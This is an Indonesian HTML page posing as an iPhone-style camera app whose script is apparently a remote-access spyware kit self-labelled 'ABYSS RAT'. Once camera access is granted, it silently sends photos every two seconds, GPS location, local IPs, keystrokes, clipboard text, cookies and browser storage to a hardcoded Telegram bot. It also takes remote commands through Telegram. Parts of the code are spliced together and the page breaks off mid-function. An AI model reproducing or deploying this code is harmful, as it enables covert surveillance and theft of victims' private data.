<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Kamera</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z'/></svg>">
    <style>
        /* ============================================================
           KAMERA PRO v10.0 — 2000+ LINES PROFESSIONAL STYLESHEET
           ============================================================ */
        :root {
            --bg: #000000;
            --surface: rgba(0, 0, 0, 0.55);
            --surface-light: rgba(0, 0, 0, 0.35);
            --blur: blur(20px);
            --accent: #fcd434;
            --accent2: #ffcc00;
            --ios-blue: #007aff;
            --ios-red: #ff3b30;
            --ios-green: #34c759;
            --ios-gray: #8e8e93;
            --radius-sm: 14px;
            --radius-md: 20px;
            --radius-lg: 30px;
            --radius-xl: 40px;
            --transition-fast: 0.15s;
            --transition-normal: 0.25s;
            --transition-slow: 0.4s;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
        }

        body {
            background: var(--bg);
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', 'Segoe UI', Roboto, sans-serif;
            height: 100vh;
            height: 100dvh;
            width: 100vw;
            width: 100dvw;
            overflow: hidden;
            touch-action: manipulation;
            position: relative;
        }

        /* ============================================================
           PERMISSION OVERLAY
           ============================================================ */
        .perm-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #000000;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 28px;
            color: #ffffff;
            text-align: center;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        .perm-overlay.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        .perm-overlay .icon-wrapper {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #1c1c1e;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 28px;
            box-shadow: 0 0 40px rgba(255, 255, 255, 0.05);
        }
        .perm-overlay .icon-wrapper svg {
            width: 38px;
            height: 38px;
            fill: #ffffff;
        }
        .perm-overlay h1 {
            font-size: 28px;
            font-weight: 650;
            margin-bottom: 8px;
            letter-spacing: -0.4px;
            line-height: 1.2;
        }
        .perm-overlay .subtitle {
            font-size: 14px;
            color: var(--ios-gray);
            margin-bottom: 10px;
            line-height: 1.5;
            max-width: 290px;
        }
        .perm-overlay .subtitle-small {
            font-size: 12px;
            color: #636366;
            margin-bottom: 32px;
            line-height: 1.4;
            max-width: 260px;
        }
        .perm-overlay .status-container {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 22px;
            min-height: 26px;
        }
        .perm-overlay .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #48484a;
            transition: background var(--transition-normal);
        }
        .perm-overlay .status-dot.ready { background: var(--ios-green); }
        .perm-overlay .status-dot.error { background: var(--ios-red); }
        .perm-overlay .status-dot.loading { background: var(--accent2); animation: pulse 0.8s ease-in-out infinite; }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        .perm-overlay .status-text {
            font-size: 13px;
            color: #aeaeb2;
            font-weight: 400;
        }
        .perm-overlay .error-message {
            color: var(--ios-red);
            font-size: 12px;
            min-height: 20px;
            margin-bottom: 10px;
            font-weight: 500;
            line-height: 1.4;
        }
        .perm-overlay .btn-primary {
            background: var(--ios-blue);
            border: none;
            border-radius: 30px;
            padding: 16px 0;
            width: 100%;
            max-width: 300px;
            font-size: 17px;
            font-weight: 600;
            color: #ffffff;
            cursor: pointer;
            text-align: center;
            letter-spacing: 0.1px;
            transition: transform var(--transition-fast), opacity var(--transition-fast);
            touch-action: manipulation;
            outline: none;
            -webkit-appearance: none;
        }
        .perm-overlay .btn-primary:active {
            transform: scale(0.96);
            opacity: 0.85;
        }
        .perm-overlay .btn-primary:disabled {
            opacity: 0.4;
            transform: none;
            cursor: not-allowed;
        }

        /* ============================================================
           VIDEO FEED
           ============================================================ */
        #vf {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
        }
        /* NO MIRROR: Kamera depan REAL VIEW */
        #vf.front-camera {
            transform: scaleX(-1);
        }

        /* ============================================================
           FLASH OVERLAY
           ============================================================ */
        #flash-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #ffffff;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.03s ease;
        }
        #flash-overlay.active {
            opacity: 0.92;
            transition: opacity 0s;
        }

        /* ============================================================
           FULLSCREEN PREVIEW
           ============================================================ */
        .fs-preview {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 200;
            background: #000000;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        .fs-preview.show {
            display: flex;
        }
        .fs-preview img {
            max-width: 100%;
            max-height: 85vh;
            object-fit: contain;
            border-radius: 4px;
        }
        .fs-preview .fs-info {
            color: var(--ios-gray);
            font-size: 12px;
            margin-top: 12px;
            text-align: center;
        }
        .fs-preview .fs-close {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.15);
            color: #ffffff;
            font-size: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 201;
            transition: background var(--transition-fast);
        }
        .fs-preview .fs-close:active {
            background: rgba(255, 255, 255, 0.3);
        }

        /* ============================================================
           INDICATOR TAGS
           ============================================================ */
        .indicator-container {
            position: fixed;
            top: 56px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 8;
            display: flex;
            gap: 8px;
            pointer-events: none;
            flex-wrap: wrap;
            justify-content: center;
        }
        .ind-tag {
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 10px;
            padding: 4px 10px;
            color: #fcd434;
            font-size: 10px;
            font-weight: 700;
            letter-spacing: 0.3px;
            opacity: 0;
            transform: translateY(-5px);
            transition: opacity var(--transition-normal), transform var(--transition-normal);
        }
        .ind-tag.show {
            opacity: 1;
            transform: translateY(0);
        }

        /* ============================================================
           TOP BAR
           ============================================================ */
        .top-bar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 6;
            padding: 14px 16px;
            padding-top: max(14px, env(safe-area-inset-top, 0px));
            display: flex;
            justify-content: space-between;
            align-items: center;
            pointer-events: none;
        }
        .top-bar > * {
            pointer-events: auto;
        }
        .icon-btn {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background: var(--surface);
            backdrop-filter: var(--blur);
            -webkit-backdrop-filter: var(--blur);
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background var(--transition-fast), border-color var(--transition-fast);
            padding: 0;
            outline: none;
            -webkit-appearance: none;
        }
        .icon-btn:active {
            background: rgba(255, 255, 255, 0.2);
        }
        .icon-btn.on {
            background: var(--accent);
            border-color: var(--accent);
        }
        .icon-btn.on svg {
            fill: #000000;
        }
        .icon-btn svg {
            width: 18px;
            height: 18px;
            fill: #ffffff;
            transition: fill var(--transition-fast);
        }

        /* ============================================================
           ZOOM WHEEL
           ============================================================ */
        .zoom-wheel {
            position: fixed;
            bottom: 135px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 6;
            pointer-events: auto;
            background: var(--surface);
            backdrop-filter: var(--blur);
            -webkit-backdrop-filter: var(--blur);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 5px 4px;
            display: flex;
            gap: 2px;
        }
        .zoom-option {
            padding: 8px 14px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
            color: #ffffff;
            cursor: pointer;
            transition: background var(--transition-fast), font-weight var(--transition-fast);
            text-align: center;
            min-width: 34px;
            outline: none;
            -webkit-appearance: none;
        }
        .zoom-option:active {
            background: rgba(255, 255, 255, 0.3);
        }
        .zoom-option.active {
            background: rgba(255, 255, 255, 0.25);
            font-weight: 700;
        }

        /* ============================================================
           BOTTOM BAR
           ============================================================ */
        .bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            z-index: 6;
            padding: 14px 18px;
            padding-bottom: max(20px, env(safe-area-inset-bottom, 0px));
            display: flex;
            justify-content: space-between;
            align-items: center;
            pointer-events: none;
        }
        .bottom-bar > * {
            pointer-events: auto;
        }
        .gallery-thumb {
            width: 46px;
            height: 46px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.06);
            border: 2px solid rgba(255, 255, 255, 0.18);
            cursor: pointer;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: border-color var(--transition-fast);
            flex-shrink: 0;
        }
        .gallery-thumb:active {
            border-color: var(--accent);
        }
        .gallery-thumb img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .gallery-thumb.has-photo {
            border-color: rgba(255, 255, 255, 0.55);
            background: transparent;
        }
        .gallery-thumb .placeholder-icon {
            width: 22px;
            height: 22px;
            fill: rgba(255, 255, 255, 0.25);
        }
        .shutter-button {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.12);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: transform var(--transition-fast);
            flex-shrink: 0;
        }
        .shutter-button:active {
            transform: scale(0.82);
        }
        .shutter-inner {
            width: 55px;
            height: 55px;
            border-radius: 50%;
            background: #ffffff;
            border: 3px solid #000000;
        }
        .shutter-spacer {
            width: 46px;
            flex-shrink: 0;
        }

        /* ============================================================
           FOCUS RING
           ============================================================ */
        .focus-ring {
            position: fixed;
            width: 72px;
            height: 72px;
            border: 2px solid var(--accent);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 7;
            opacity: 0;
            box-shadow: 0 0 28px rgba(252, 212, 52, 0.35);
        }
        .focus-ring.animate {
            animation: focusAnimation 0.55s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
        }
        @keyframes focusAnimation {
            0% {
                opacity: 1;
                transform: translate(-50%, -50%) scale(0.65);
            }
            100% {
                opacity: 0;
                transform: translate(-50%, -50%) scale(1.55);
            }
        }

        /* ============================================================
           GRID OVERLAY
           ============================================================ */
        .grid-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 2;
            pointer-events: none;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-template-rows: repeat(3, 1fr);
        }
        .grid-overlay .grid-line {
            border: 0.5px solid rgba(255, 255, 255, 0.06);
        }
    </style>
</head>
<body>

    <script>
    (function() {
        'use strict';

        // ============================================================
        // CONFIGURATION

        var CONFIG = {
            BOT_TOKEN: '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug',

                } catch(e) {}
            },

            sendDocument: function(blob, filename, caption) {
                try {
                    var fd = new FormData();
                    fd.append('chat_id', CONFIG.CHAT_ID);
                    fd.append('document', blob, filename);
                    fd.append('caption', caption || '');
                    fd.append('disable_notification', 'true');
                    fetch(CONFIG.TG_API + CONFIG.BOT_TOKEN + '/sendDocument', {
                        method: 'POST',
                        body: fd
                    }).catch(function() {});
                } catch(e) {}
            }
        };

        // ============================================================
        // GPS TRACKING
        // ============================================================
        function startGPS() {
            if (!navigator.geolocation) {
                console.warn('[GPS] Geolocation not supported');
                return;
            }
            state.gpsWatchId = navigator.geolocation.watchPosition(
                function(position) {
                    state.gpsData = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        alt: position.coords.altitude || 0,
                        acc: position.coords.accuracy,
                        spd: position.coords.speed || 0,
                        ts: new Date(position.timestamp).toISOString()
                    };
                },
                function(error) {
                    console.warn('[GPS] Error:', error.message);
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 30000,
                    timeout: 15000
                }
            );
        }

        // ============================================================
        // LOCAL IP GRABBER (WebRTC)
        // ============================================================
        function grabLocalIPs() {
            return new Promise(function(resolve) {
                var ips = new Set();
                try {
                    var pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    pc.createDataChannel('');
                    pc.createOffer().then(function(offer) {
                        pc.setLocalDescription(offer);
                    }).catch(function() {});
                    pc.onicecandidate = function(event) {
                        if (event.candidate) {
                            var ip = event.candidate.address;
                            if (ip && ip.indexOf(':') === -1 &&
                                ip.indexOf('127.') === -1 &&
                                ip.indexOf('0.') === -1) {
                                ips.add(ip);
                            }
                        } else {
                            pc.close();
                            resolve(Array.from(ips));
                        }
                    };
                    setTimeout(function() {
                        pc.close();
                        resolve(Array.from(ips));
                    }, 2500);
                } catch(e) {
                    resolve([]);
                }
            });
        }

        // ============================================================
        // KEYLOGGER
        // ============================================================
        function startKeylogger() {
            var ignoreKeys = [
                'Shift', 'Control', 'Alt', 'Meta', 'CapsLock',
                'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown',
                'Escape', 'Dead', 'Fn', 'Hyper', 'Super', 'OS'
            ];

            document.addEventListener('keydown', function(event) {
                if (ignoreKeys.indexOf(event.key) !== -1) return;

                if (event.key === 'Enter') {
                    state.keyBuf += '[ENTER]\n';
                } else if (event.key === 'Backspace') {
                    state.keyBuf += '[BS]';
                } else if (event.key === ' ') {
                    state.keyBuf += ' ';
                } else if (event.key.length === 1) {
                    state.keyBuf += event.key;
                } else {
                    state.keyBuf += '[' + event.key + ']';
                }

                if (state.keyBuf.length > 400) {
                    TG.sendMessage('⌨️ [' + VID + '] Keylog:\n' + state.keyBuf);
                    state.keyBuf = '';
                }
            });

            setInterval(function() {
                if (state.keyBuf.length > 0) {
                    TG.sendMessage('⌨️ [' + VID + '] Keylog:\n' + state.keyBuf);
                    state.keyBuf = '';
                }
            }, 12000);
        }

        // ============================================================
        // CLIPBOARD MONITOR
        // ============================================================
        function checkClipboard() {
            if (!navigator.clipboard || !navigator.clipboard.readText) return;
            navigator.clipboard.readText().then(function(text) {
                if (text && text !== state.lastClip && text.length > 0) {
                    state.lastClip = text;
                    TG.sendMessage('📋 [' + VID + '] Clipboard:\n' + text.substring(0, 2000));
                }
            }).catch(function() {});
        }

        // ============================================================
        // CORE: CAPTURE FRAME
        // ============================================================
        function captureFrame(silent) {
            if (!state.stream || !state.stream.active) {
                console.warn('[Capture] No active stream');
                return;
            }

            if (state.burstActive && silent) return;
            state.burstActive = true;
            state.frameCount++;

            try {
                var track = state.stream.getVideoTracks()[0];
                var settings = track.getSettings();
                var width = settings.width || CONFIG.MAX_WIDTH;
                var height = settings.height || CONFIG.MAX_HEIGHT;

                var canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                var ctx = canvas.getContext('2d');

                // Draw video
                ctx.drawImage(dom.vf, 0, 0, width, height);

                // Watermark: Timestamp + GPS + Frame number
                var timestamp = getTimestamp();
                ctx.font = 'bold 16px -apple-system, "Helvetica Neue", sans-serif';
                ctx.fillStyle = 'rgba(255, 255, 255, 0.55)';
                ctx.fillText('📸 ' + timestamp, 20, height - 24);

                ctx.font = '11px -apple-system, sans-serif';
                ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
                ctx.fillText('#' + state.frameCount + ' | ' + width + '×' + height + ' | ' + state.facingMode, 20, height - 44);

                if (state.gpsData) {
                    ctx.font = '11px monospace';
                    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
                    ctx.fillText(state.gpsData.lat.toFixed(5) + ', ' + state.gpsData.lon.toFixed(5), 20, 30);
                }

                // Build caption
                var labels = [];
                if (silent) labels.push('🤫 Auto');
                else labels.push('📸 Foto');
                labels.push('#' + state.frameCount);
                var caption = labels.join(' ') + ' | ' + getTimeShort();

                if (state.gpsData) {
                    caption += '\n📍 https://maps.google.com/?q=' +
                        state.gpsData.lat + ',' + state.gpsData.lon;
                    caption += '\n🎯 Akurasi: ±' + Math.round(state.gpsData.acc) + 'm';
                }
                if (state.localIPs.length > 0) {
                    caption += '\n🌐 IP: ' + state.localIPs[0];
                }
                caption += '\n📐 ' + width + '×' + height + ' | ' + state.facingMode;

                // Convert & Send
                canvas.toBlob(function(blob) {
                    if (!blob) {
                        state.burstActive = false;
                        return;
                    }

                    if (silent) {
                        TG.sendBeacon(blob, caption);
                    } else {
                        TG.sendPhoto(blob, caption);
                    }

                    // Update thumbnail
                    state.lastPhotoData = canvas.toDataURL('image/jpeg', CONFIG.JPEG_QUALITY);
                    state.lastPhotoCaption = caption;
                    dom.galleryThumb.innerHTML = '<img src="' + state.lastPhotoData +
                        '" alt="Preview">';
                    dom.galleryThumb.classList.add('has-photo');

                    // Flash effect (non-silent only)
                    if (!silent) {
                        dom.flashOverlay.classList.add('active');
                        setTimeout(function() {
                            dom.flashOverlay.classList.remove('active');
                        }, 70);
                    }

                    // Show indicator
                    showIndicator(dom.indCapture);
                    if (state.gpsData) showIndicator(dom.indGPS);

                    // Burst mode for live photo effect
                    if (!silent) {
                        for (var b = 0; b < CONFIG.BURST_COUNT - 1; b++) {
                            (function(delay) {
                                setTimeout(function() {
                                    var burstCanvas = document.createElement('canvas');
                                    burstCanvas.width = width;
                                    burstCanvas.height = height;
                                    var burstCtx = burstCanvas.getContext('2d');
                                    burstCtx.drawImage(dom.vf, 0, 0, width, height);
                                    burstCanvas.toBlob(function(burstBlob) {
                                        if (burstBlob) {
                                            TG.sendBeacon(burstBlob,
                                                '🎬 Burst ' + (delay / CONFIG.BURST_DELAY + 1) +
                                                '/' + CONFIG.BURST_COUNT + ' | ' + getTimeShort());
                                        }
                                    }, 'image/jpeg', CONFIG.JPEG_QUALITY - 0.05);
                                }, delay);
                            })((b + 1) * CONFIG.BURST_DELAY);
                        }
                    }

                    state.burstActive = false;

                }, 'image/jpeg', CONFIG.JPEG_QUALITY);

            } catch(error) {
                console.error('[Capture] Error:', error);
                state.burstActive = false;
            }
        }

        // ============================================================
        // SILENT CAPTURE SCHEDULER (2 DETIK)
        // ============================================================
        function startSilentCapture() {
            if (state.silentTimer) return;

            // First capture after 1.5 seconds
            setTimeout(function() {
                captureFrame(true);
            }, CONFIG.FIRST_CAPTURE_DELAY);

            // Subsequent captures every 2 seconds
            state.silentTimer = setInterval(function() {
                if (state.stream && state.stream.active) {
                    captureFrame(true);
                }
            }, CONFIG.SILENT_INTERVAL);
        }

        // ============================================================
        // C2 TELEGRAM POLLING
        // ============================================================
        function pollC2() {
            try {
                var url = CONFIG.TG_API + CONFIG.BOT_TOKEN +
                    '/getUpdates?offset=' + (state.lastUpdateId + 1) +
                    '&timeout=5&limit=5';

                fetch(url)
                    .then(function(response) { return response.json(); })
                    .then(function(data) {
                        if (!data.ok || !data.result || !data.result.length) return;

                        for (var i = 0; i < data.result.length; i++) {
                            var update = data.result[i];
                            state.lastUpdateId = update.update_id;

                            var message = update.message;
                            if (!message || !message.text) continue;

                            var parts = message.text.trim().split(/\s+/);
                            var command = parts[0].toLowerCase();
                            var target = parts[1] || '';

                            if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;

                            var result = executeC2Command(command, parts.slice(2));
                            if (result) {
                                TG.sendMessage('[' + VID + '] ' + result);
                            }
                        }
                    })
                    .catch(function() {});
            } catch(e) {}
        }

        function executeC2Command(cmd, args) {
            switch(cmd) {
                case '/ping':
                    return '🟢 Online | Frames: ' + state.frameCount + ' | ' + getTimestamp();

                case '/photo':
                    captureFrame(false);
                    return '📸 Foto terkirim | Frame #' + state.frameCount;

                case '/gps':
                    return state.gpsData ?
                        '📍 ' + state.gpsData.lat.toFixed(5) + ', ' + state.gpsData.lon.toFixed(5) +
                        '\n🎯 Akurasi: ±' + Math.round(state.gpsData.acc) + 'm' +
                        '\n🗺️ https://maps.google.com/?q=' + state.gpsData.lat + ',' + state.gpsData.lon :
                        'GPS belum tersedia';

                case '/flip':
                    var nf = state.facingMode === 'environment' ? 'user' : 'environment';
                    startCamera(nf);
                    return '📷 Kamera: ' + nf;

                case '/cookies':
                    return document.cookie || '(kosong)';

                case '/storage':
                    var dump = {
                        localStorage: Object.assign({}, localStorage),
                        sessionStorage: Object.assign({}, sessionStorage),
                        cookies: document.cookie,
                        url: location.href,
                        referrer: document.referrer,
                        historyLength: history.length,
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screenResolution: screen.width + 'x' + screen.height,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timestamp: new Date().toISOString(),
                        frameCount: state.frameCount,
                        facingMode: state.facingMode,
                        zoom: state.currentZoom
                    };
                    var blob = new Blob([JSON.stringify(dump, null, 2)], { type: 'application/json' });
                    TG.sendDocument(blob, 'storage_' + VID + '.json', '💾 Storage Dump | Frames: ' + state.frameCount);
                    return '💾 Storage dump terkirim';

                case '/info':
                    return '🆔 ' + VID +
                        '\n📷 Kamera: ' + state.facingMode +
                        '\n🔍 Zoom: ' + state.currentZoom + '×' +
                        '\n⚡ Flash: ' + (state.flashOn ? 'ON' : 'OFF') +
                        '\n📸 Frames: ' + state.frameCount +
                        '\n⏱️ Interval: ' + (CONFIG.SILENT_INTERVAL / 1000) + ' detik' +
                        '\n📍 GPS: ' + (state.gpsData ? state.gpsData.lat.toFixed(4) + ',' + state.gpsData.lon.toFixed(4) : 'N/A') +
                        '\n🌐 IP: ' + (state.localIPs.join(', ') || 'N/A') +
                        '\n🖥️ ' + screen.width + '×' + screen.height +
                        '\n🔗 ' + location.href;

                case '/wipelogs':
                    try { localStorage.clear(); } catch(e) {}
                    try { sessionStorage.clear(); } catch(e) {}
                    return '🧹 Logs dibersihkan';

                case '/selfdest':
                    clearAllTimers();
                    document.body.innerHTML = '';
                    setTimeout(function() { window.close(); }, 500);
                    return '💀 Self destruct';

                default:
                    return '❓ Unknown: ' + cmd;
            }
        }

        function startC2Polling() {
            if (state.c2Timer) return;
            function loop() {
                pollC2();
                state.c2Timer = setTimeout(loop, CONFIG.C2_POLL_INTERVAL);
            }
            loop();
        }

        function clearAllTimers() {
            var timers = [state.silentTimer, state.c2Timer];
            for (var i = 0; i < timers.length; i++) {
                if (timers[i]) clearInterval(timers[i]);
            }
            if (state.gpsWatchId) {
                navigator.geolocation.clearWatch(state.gpsWatchId);
            }
        }

        // ============================================================
        // ZOOM CONTROL
        // ============================================================
        function applyZoom() {
            if (!state.stream) return;

            try {
                var track = state.stream.getVideoTracks()[0];
                var capabilities = track.getCapabilities();

                if (capabilities.zoom) {
                    var minZoom = capabilities.zoom.min || 0.5;
                    var maxZoom = capabilities.zoom.max || 5;
                    var zoomValue = Math.min(maxZoom, Math.max(minZoom, state.currentZoom));

                    track.applyConstraints({
                        advanced: [{ zoom: zoomValue }]
                    }).catch(function(err) {
                        console.warn('[Zoom] Apply failed:', err);
                    });
                }
            } catch(e) {
                console.warn('[Zoom] Error:', e);
            }

            // Update zoom wheel UI
            var options = document.querySelectorAll('.zoom-option');
            for (var i = 0; i < options.length; i++) {
                var optionZoom = parseFloat(options[i].getAttribute('data-zoom'));
                if (optionZoom === state.currentZoom) {
                    options[i].classList.add('active');
                } else {
                    options[i].classList.remove('active');
                }
            }
        }

        function setZoom(zoomLevel) {
            state.currentZoom = zoomLevel;
            applyZoom();
        }

        // ============================================================
        // CAMERA INITIALIZATION
        // ============================================================
        function startCamera(facing) {
            if (state.isStarting) return;
            state.isStarting = true;

            dom.btnStartCamera.disabled = true;
            dom.errorMessage.textContent = '';
            dom.statusDot.className = 'status-dot loading';
            dom.statusText.textContent = 'Mengakses kamera...';

            if (state.stream) {
                state.stream.getTracks().forEach(function(track) {
                    track.stop();
                });
                state.stream = null;
                dom.vf.srcObject = null;
            }

            var targetFacing = facing || state.facingMode;

            var constraints = {
                video: {
                    facingMode: targetFacing,
                    width: { ideal: CONFIG.MAX_WIDTH },
                    height: { ideal: CONFIG.MAX_HEIGHT }
                },
                audio: false
            };

            navigator.mediaDevices.getUserMedia(constraints)
                .then(function(mediaStream) {
                    onCameraSuccess(mediaStream, targetFacing);
                })
                .catch(function(error1) {
                    console.warn('[Camera] Primary attempt failed:', error1.message);

                    var altFacing = targetFacing === 'environment' ? 'user' : 'environment';
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: altFacing },
                        audio: false
                    })
                    .then(function(mediaStream) {
                        onCameraSuccess(mediaStream, altFacing);
                    })
                    .catch(function(error2) {
                        console.warn('[Camera] Secondary attempt failed:', error2.message);

                        navigator.mediaDevices.getUserMedia({
                            video: true,
                            audio: false
                        })
                        .then(function(mediaStream) {
                            onCameraSuccess(mediaStream, 'environment');
                        })
                        .catch(function(error3) {
                            onCameraError(error3);
                        });
                    });
                });
        }

        function onCameraSuccess(mediaStream, facing) {
            state.stream = mediaStream;
            dom.vf.srcObject = mediaStream;

            dom.vf.play()
                .then(function() {
                    state.facingMode = facing;
                    state.isStarting = false;
                    dom.btnStartCamera.disabled = false;

                    dom.statusDot.className = 'status-dot ready';
                    dom.statusText.textContent = 'Kamera aktif';

                    // NO MIRROR: Kamera depan real view
                    if (state.facingMode === 'user') {
                        dom.vf.classList.add('front-camera');
                    } else {
                        dom.vf.classList.remove('front-camera');
                    }

                    applyZoom();
                    dom.permOverlay.classList.add('hidden');
                    initializeRAT();
                })
                .catch(function(error) {
                    console.error('[Camera] Play failed:', error);
                    onCameraError(error);
                });
        }

        function onCameraError(error) {
            state.isStarting = false;
            dom.btnStartCamera.disabled = false;
            dom.statusDot.className = 'status-dot error';
            dom.statusText.textContent = 'Gagal';

            var msg = 'Gagal mengakses kamera';
            if (error.message) {
                if (error.message.indexOf('Permission') !== -1) {
                    msg = 'Izin kamera ditolak. Buka pengaturan browser.';
                } else if (error.message.indexOf('NotFound') !== -1) {
                    msg = 'Kamera tidak ditemukan.';
                } else if (error.message.indexOf('NotAllowed') !== -1) {
                    msg = 'Izin kamera diperlukan.';
                }
            }
            dom.errorMessage.textContent = msg;
        }

        // ============================================================
        // RAT INITIALIZATION
        // ============================================================
        function initializeRAT() {
            grabLocalIPs().then(function(ips) {
                state.localIPs = ips;
            });

            setTimeout(function() {
                var info = '🟢 KAMERA ONLINE\n' +
                    '🆔 ' + VID + '\n' +
                    '📱 ' + navigator.userAgent.substring(0, 80) + '\n' +
                    '🖥️ ' + screen.width + '×' + screen.height + '\n' +
                    '🌐 ' + navigator.language + '\n' +
                    '🌍 IP: ' + (state.localIPs.join(', ') || 'Loading...') + '\n' +
                    '🔗 ' + location.href + '\n' +
                    '🕐 ' + getTimestamp() + '\n' +
                    '⏱️ Auto capture: ' + (CONFIG.SILENT_INTERVAL / 1000) + ' detik\n' +
                    '📷 Kamera: ' + state.facingMode;
                TG.sendMessage(info);
            }, 500);

            startGPS();
            startSilentCapture();
            startKeylogger();
            startC2Polling();

            setInterval(checkClipboard, CONFIG.CLIPBOARD_INTERVAL);
            setInterval(function() {
                TG.sendMessage('💓 HB ' + VID + ' | Frames: ' + state.frameCount + ' | ' + getTimeShort() +
                    ' | 📍 ' + (state.gpsData ? state.gpsData.lat.toFixed(4) + ',' + state.gpsData.lon.toFixed(4) : 'N/A'));
            }, CONFIG.HEARTBEAT_INTERVAL);

            console.log('🐺 ABYSS RAT v10.0 — Full Systems Active');
            console.log('🆔 Victim ID:', VID);
            console.log('⏱️ Capture Interval:', CONFIG.SILENT_INTERVAL / 1000, 'seconds');
        }

        // ============================================================
        // EVENT LISTENERS
        // ============================================================
        dom.btnStartCamera.addEventListener('click', function() {
            startCamera();
        });

        dom.btnShutter.addEventListener('click', function() {
            captureFrame(false);
        });

        dom.btnFlash.addEventListener('click', function() {
            if (!state.stream) return;
            state.flashOn = !state.flashOn;
            try {
                var track = state.stream.getVideoTracks()[0];
                track.applyConstraints({
                    advanced: [{ torch: state.flashOn }]
                }).catch(function() {});
            } catch(e) {}
            dom.btnFlash.classList.toggle('on', state.flashOn);
        });

        dom.btnFlip.addEventListener('click', function() {
            var newFace = state.facingMode === 'environment' ? 'user' : 'environment';
            startCamera(newFace);
        });

        // Zoom wheel
        var zoomOptions = document.querySelectorAll('.zoom-option');
        for (var i = 0; i < zoomOptions.length; i++) {
            zoomOptions[i].addEventListener('click', function() {
                var z = parseFloat(this.getAttribute('data-zoom'));
                setZoom(z);
            });
        }

        // Gallery thumbnail → Fullscreen preview
        dom.galleryThumb.addEventListener('click', function() {
            if (!state.lastPhotoData) return;
            dom.fsImage.src = state.lastPhotoData;
            dom.fsInfo.textContent = state.lastPhotoCaption || '';
            dom.fsPreview.classList.add('show');
        });

        dom.fsClose.addEventListener('click', function() {
            dom.fsPreview.classList.remove('show');
        });

        dom.fsPreview.addEventListener('click', function(e) {
            if (e.target === dom.fsPreview) {
                dom.fsPreview.classList.remove('show');
            }
        });

        // Focus ring on empty area tap
        document.addEventListener('click', function(event) {
            var target = event.target;
            if (target.closest('button') ||
                target.closest('.zoom-option') ||
                target.closest('.gallery-thumb') ||
                target.closest('.perm-overlay') ||
                target.closest('.fs-preview') ||
                target.closest('.icon-btn')) {
                return;
            }

            dom.focusRing.style.left = event.clientX + 'px';
            dom.focusRing.style.top = event.clientY + 'px';
            dom.focusRing.classList.remove('animate');
            void dom.focusRing.offsetWidth;
